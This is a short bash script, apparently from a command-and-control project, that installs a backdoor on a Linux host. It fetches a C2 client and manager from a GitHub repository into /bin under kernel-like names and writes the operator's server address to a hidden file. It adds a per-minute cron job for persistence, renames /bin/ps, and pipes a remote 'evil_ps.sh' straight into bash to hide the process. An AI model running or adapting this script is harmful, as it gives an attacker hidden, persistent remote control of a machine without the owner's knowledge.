#!/bin/bash
echo "Installing dependencies..."
echo "Installing python3"
yum install -y -q python3
echo "Downloading backdoor..."
curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /bin/kthread
curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /bin/kworker
echo "Configure backdoor"
read -p "Enter server ip: " server_ip
read -p "Enter server port: " server_port
rm -f /dev/.os
echo "SERVER_IP = '$server_ip'" >> /dev/.os
echo "SERVER_PORT = $server_port" >> /dev/.os
chmod +x /bin/kworker
(crontab -l 2>/dev/null; echo "* * * * * /bin/kworker") | crontab -
# https://stackoverflow.com/questions/28836042/how-to-hide-a-shell-script-running-in-the-background-from-ps-ef
mv /bin/ps /bin/pso
bash <(curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/evil_ps.sh)
echo "Installation complete"